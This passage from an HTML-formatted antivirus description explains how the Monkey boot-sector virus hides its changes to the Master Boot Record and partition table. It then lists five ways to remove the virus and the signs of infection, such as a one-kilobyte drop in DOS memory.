 </span><span class="sc5">remove.</span><span class="sc0"> </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">changes</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Master</span><span class="sc0"> </span><span class="sc5">Boot</span><span class="sc0"> </span><span class="sc9">Record</span><span class="sc0"> </span><span class="sc5">cannot</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">detected</span><span class="sc0">
 </span><span class="sc9">while</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">active</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">since</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">rerouts</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">BIOS</span><span class="sc4">-</span><span class="sc5">level</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc0">
 </span><span class="sc5">calls</span><span class="sc0"> </span><span class="sc5">through</span><span class="sc0"> </span><span class="sc5">its</span><span class="sc0"> </span><span class="sc5">own</span><span class="sc0"> </span><span class="sc5">code.</span><span class="sc0"> </span><span class="sc5">Upon</span><span class="sc0"> </span><span class="sc5">inspection</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc0"> </span><span class="sc5">seems</span><span class="sc0">
 </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">its</span><span class="sc0"> </span><span class="sc5">original</span><span class="sc0"> </span><span class="sc5">shape.</span><span class="sc0">

 </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">relocation</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">encryption</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">partition</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0"> </span><span class="sc5">render</span><span class="sc0"> </span><span class="sc5">two</span><span class="sc0">
 </span><span class="sc5">often</span><span class="sc4">-</span><span class="sc5">used</span><span class="sc0"> </span><span class="sc5">disinfection</span><span class="sc0"> </span><span class="sc5">procedures</span><span class="sc0"> </span><span class="sc5">unviable.</span><span class="sc0"> </span><span class="sc5">One</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">these</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0">
 </span><span class="sc5">MS</span><span class="sc4">-</span><span class="sc5">DOS</span><span class="sc0"> </span><span class="sc5">command</span><span class="sc0"> </span><span class="sc5">FDISK</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">MBR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">capable</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">removing</span><span class="sc0"> </span><span class="sc5">most</span><span class="sc0"> </span><span class="sc5">viruses</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0">
 </span><span class="sc5">infect</span><span class="sc0"> </span><span class="sc5">Master</span><span class="sc0"> </span><span class="sc5">Boot</span><span class="sc0"> </span><span class="sc5">Records.</span><span class="sc0"> </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">other</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">using</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc0"> </span><span class="sc5">editor</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0">
 </span><span class="sc5">restore</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Master</span><span class="sc0"> </span><span class="sc5">Boot</span><span class="sc0"> </span><span class="sc9">Record</span><span class="sc0"> </span><span class="sc5">back</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">zero</span><span class="sc0"> </span><span class="sc5">track.</span><span class="sc0"> </span><span class="sc5">Although</span><span class="sc0">
 </span><span class="sc5">both</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">these</span><span class="sc0"> </span><span class="sc5">procedures</span><span class="sc0"> </span><span class="sc5">destroy</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">actual</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0">
 </span><span class="sc5">computer</span><span class="sc0"> </span><span class="sc5">cannot</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">booted</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc0"> </span><span class="sc5">afterwards.</span><span class="sc0">

 </span><span class="sc5">There</span><span class="sc0"> </span><span class="sc5">are</span><span class="sc0"> </span><span class="sc5">five</span><span class="sc0"> </span><span class="sc5">different</span><span class="sc0"> </span><span class="sc5">ways</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">remove</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0">
 </span><span class="sc5">virus</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc5">o</span><span class="sc0">       </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">original</span><span class="sc0"> </span><span class="sc5">Master</span><span class="sc0"> </span><span class="sc5">Boot</span><span class="sc0"> </span><span class="sc9">Record</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">partition</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0"> </span><span class="sc5">can</span><span class="sc0">
         </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">restored</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">backup</span><span class="sc0"> </span><span class="sc5">taken</span><span class="sc0"> </span><span class="sc5">before</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">infection.</span><span class="sc0">
         </span><span class="sc5">Such</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">backup</span><span class="sc0"> </span><span class="sc5">can</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">made</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">using</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">example</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0">
         </span><span class="sc5">MIRROR</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">PARTN</span><span class="sc0"> </span><span class="sc5">command</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">MS</span><span class="sc4">-</span><span class="sc5">DOS</span><span class="sc0"> </span><span class="sc2">5.</span><span class="sc0">

 </span><span class="sc5">o</span><span class="sc0">       </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc0"> </span><span class="sc5">can</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">repartitioned</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">using</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">FDISK</span><span class="sc0">
         </span><span class="sc5">program</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">after</span><span class="sc0"> </span><span class="sc5">which</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">logical</span><span class="sc0"> </span><span class="sc5">disks</span><span class="sc0"> </span><span class="sc5">must</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">formatted.</span><span class="sc0">
         </span><span class="sc10">All</span><span class="sc0"> </span><span class="sc5">data</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">consequently</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">lost</span><span class="sc4">,</span><span class="sc0">
         </span><span class="sc5">however.</span><span class="sc0">

 </span><span class="sc5">o</span><span class="sc0">       </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">code</span><span class="sc0"> </span><span class="sc5">can</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">overwritten</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">using</span><span class="sc0"> </span><span class="sc5">FDISK</span><span class="sc4">/</span><span class="sc5">MBR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0">
         </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">partition</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0"> </span><span class="sc5">restored</span><span class="sc0"> </span><span class="sc5">manually.</span><span class="sc0"> </span><span class="sc6">In</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">case</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0">
         </span><span class="sc5">partition</span><span class="sc0"> </span><span class="sc5">values</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc0"> </span><span class="sc5">must</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">calculated</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0">
         </span><span class="sc5">inserted</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">partition</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0"> </span><span class="sc5">with</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">help</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc0">
         </span><span class="sc5">editor.</span><span class="sc0"> </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">method</span><span class="sc0"> </span><span class="sc5">requires</span><span class="sc0"> </span><span class="sc5">expert</span><span class="sc0"> </span><span class="sc5">knowledge</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc0">
         </span><span class="sc5">structure</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">its</span><span class="sc0"> </span><span class="sc5">success</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">doubtful.</span><span class="sc0">

 </span><span class="sc5">o</span><span class="sc0">       </span><span class="sc5">It</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">possible</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">exploit</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc13">'s stealth capabilities
</span><span class="sc0">         </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">taking</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">copy</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">zero</span><span class="sc0"> </span><span class="sc5">track</span><span class="sc0"> </span><span class="sc9">while</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0">
         </span><span class="sc5">active.</span><span class="sc0"> </span><span class="sc5">Since</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">hides</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">changes</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">has</span><span class="sc0"> </span><span class="sc5">made</span><span class="sc4">,</span><span class="sc0">
         </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">copy</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">actually</span><span class="sc0"> </span><span class="sc5">contain</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">original</span><span class="sc0"> </span><span class="sc5">Master</span><span class="sc0"> </span><span class="sc5">Boot</span><span class="sc0">
         </span><span class="sc5">Record.</span><span class="sc0"> </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc5">method</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">recommendable</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">because</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0">
         </span><span class="sc5">diskettes</span><span class="sc0"> </span><span class="sc5">used</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">copying</span><span class="sc0"> </span><span class="sc5">may</span><span class="sc0"> </span><span class="sc5">well</span><span class="sc0"> </span><span class="sc5">get</span><span class="sc0"> </span><span class="sc5">infected.</span><span class="sc0">

 </span><span class="sc5">o</span><span class="sc0">       </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">original</span><span class="sc0"> </span><span class="sc5">zero</span><span class="sc0"> </span><span class="sc5">track</span><span class="sc0"> </span><span class="sc5">can</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">located</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">decrypted</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0">
         </span><span class="sc5">moved</span><span class="sc0"> </span><span class="sc5">back</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">its</span><span class="sc0"> </span><span class="sc5">proper</span><span class="sc0"> </span><span class="sc5">place.</span><span class="sc0"> </span><span class="sc5">As</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">result</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0">
         </span><span class="sc5">disk</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">restored</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">its</span><span class="sc0"> </span><span class="sc5">exact</span><span class="sc0"> </span><span class="sc5">original</span><span class="sc0"> </span><span class="sc5">state.</span><span class="sc0"> </span><span class="sc5">F</span><span class="sc4">-</span><span class="sc5">PROT</span><span class="sc0"> </span><span class="sc10">uses</span><span class="sc0">
         </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">method</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">disinfect</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">virus.</span><span class="sc0">

 </span><span class="sc5">It</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">difficult</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">spot</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">since</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">does</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">activate</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0">
 </span><span class="sc5">any</span><span class="sc0"> </span><span class="sc5">way.</span><span class="sc0">  </span><span class="sc5">A</span><span class="sc0"> </span><span class="sc5">one</span><span class="sc4">-</span><span class="sc5">kilobyte</span><span class="sc0"> </span><span class="sc5">reduction</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">DOS</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">only</span><span class="sc0">
 </span><span class="sc5">obvious</span><span class="sc0"> </span><span class="sc5">sign</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">its</span><span class="sc0"> </span><span class="sc5">presence.</span><span class="sc0"> </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc0"> </span><span class="sc5">can</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">checked</span><span class="sc0"> </span><span class="sc5">with</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0">
 </span><span class="sc5">instance</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DOS</span><span class="sc13">'s CHKDSK and MEM programs. However, even if MEM
</span><span class="sc0"> </span><span class="sc5">reports</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">computer</span><span class="sc0"> </span><span class="sc5">has</span><span class="sc0"> </span><span class="sc2">639</span><span class="sc0"> </span><span class="sc5">kilobytes</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc10">basic</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc0">
 </span><span class="sc5">instead</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">more</span><span class="sc0"> </span><span class="sc9">common</span><span class="sc0"> </span><span class="sc2">640</span><span class="sc0"> </span><span class="sc5">kilobytes</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">does</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">necessarily</span><span class="sc0">
 </span><span class="sc5">mean</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">computer</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">infected.</span><span class="sc0"> </span><span class="sc6">In</span><span class="sc0"> </span><span class="sc5">many</span><span class="sc0"> </span><span class="sc5">computers</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">BIOS</span><span class="sc0">
 </span><span class="sc5">allocates</span><span class="sc0"> </span><span class="sc5">one</span><span class="sc0"> </span><span class="sc5">kilobyte</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc10">basic</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">its</span><span class="sc0"> </span><span class="sc5">own</span><span class="sc0"> </span><span class="sc5">use.</span><span class="sc0">

 </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">quite</span><span class="sc0"> </span><span class="sc5">compatible</span><span class="sc0"> </span><span class="sc5">with</span><span class="sc0"> </span><span class="sc5">different</span><span class="sc0"> </span><span class="sc5">diskette</span><span class="sc0">
 </span><span class="sc5">types.</span><span class="sc0"> </span><span class="sc5">It</span><span class="sc0"> </span><span class="sc5">carries</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0"> </span><span class="sc5">containing</span><span class="sc0"> </span><span class="sc5">data</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">most</span><span class="sc0"> </span><span class="sc9">common</span><span class="sc0">
 </span><span class="sc5">diskettes.</span><span class="sc0"> </span><span class="sc5">Using</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">able</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">move</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0">
 </span><span class="sc5">diskette</span><span class="sc13">'s original boot record and a part of its own code to a
</span><span class="sc0"> </span><span class="sc5">safe</span><span class="sc0"> </span><span class="sc5">area</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">diskette.</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">does</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">recognize</span><span class="sc0"> </span><span class="sc2">2.88</span><span class="sc0">
 </span><span class="sc5">megabyte</span><span class="sc0"> </span><span class="sc5">ED</span><span class="sc0"> </span><span class="sc5">diskettes</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">however</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">partly</span><span class="sc0"> </span><span class="sc5">overwrites</span><span class="sc0"> </span><span class="sc5">their</span><span class="sc0"> </span><span class="sc5">File</span><span class="sc0">
 </span><span class="sc5">Allocation</span><span class="sc0"> </span><span class="sc5">Tables.</span><span class="sc0">


</span></div></body>
</html>
